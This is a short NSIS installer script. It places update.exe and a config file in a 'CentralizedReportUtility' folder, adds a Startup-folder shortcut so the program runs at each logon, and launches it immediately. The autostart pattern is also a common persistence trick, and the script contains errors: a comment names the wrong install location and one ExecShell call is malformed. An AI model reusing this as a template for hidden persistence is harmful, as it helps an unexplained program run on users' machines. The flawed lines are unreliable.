# define the name of the installer
caption "Update.exe installer"
Outfile "setup_update.exe"
!define INSOUT "update"
!define MUI_FINISHPAGE_RUN_FUNCTION "LaunchLink"

# define the directory to install to, the desktop in this case as specified  
# by the predefined $DESKTOP variable
InstallDir "$PROGRAMFILES\CentralizedReportUtility"

Function LaunchLink
  #MessageBox MB_OK "update.exe started"
  ExecShell "" "$PROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\${INSOUT}.lnk"
  ExecShell "update.exe started" ""
FunctionEnd

# default section
Section
 
# define the output path for this file
SetOutPath $INSTDIR

CreateShortCut "$PROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\${INSOUT}.lnk" "$INSTDIR\update.exe" "" "$INSTDIR\update.exe" 0

# define what to install and place it in the output path
File update.exe
File update.cfg
Sleep 1000
Call LaunchLink
SectionEnd




